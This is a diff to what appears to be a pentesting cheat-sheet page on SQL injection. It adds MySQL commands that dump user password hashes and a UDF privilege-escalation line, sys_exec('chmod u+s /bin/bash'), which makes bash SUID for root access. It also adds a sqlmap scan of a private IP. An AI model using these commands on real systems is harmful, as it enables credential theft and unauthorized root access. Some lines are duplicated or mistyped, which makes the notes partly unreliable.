@@ -1,4 +1,51 @@
+---
+description: SQL stuff
+---
+
 # SQL Injection
+
+## Basic SQL Commands
+
+```sql
+#basic SQL commands
+mysql -u userName -p
+show databases;
+user databaseName;
+show tables;
+describe mysql.user;
+select * from mysql.user;
+select host,user,password from mysql.user;
+
+
+#Check for UDF for code injection
+select * from mysql.func;
+#+-----------------------+-----+---------------------+----------+
+#| name                  | ret | dl                  | type     |
+#+-----------------------+-----+---------------------+----------+
+#| lib_mysqludf_sys_info |   0 | lib_mysqludf_sys.so | function | 
+#| sys_exec              |   0 | lib_mysqludf_sys.so | function | 
+#+-----------------------+-----+---------------------+----------+
+
+select sys_exec('chmod u+s /bin/bash');
+select sys_exec('chmod u+s /bin/bash');
+
+
+#basic SQL commands
+mysql -u userName -p
+
+#basic SQL commands
+mysql -u userName -p
+
+#basic SQL commands
+mysql -u userName -p
+```
+
+## SQLMAP
+
+```bash
+#sqlmap
+sqlmap -u http://172.17.1.94 --forms --dbms=MySQL
+```
 
 ## Current Schema
 
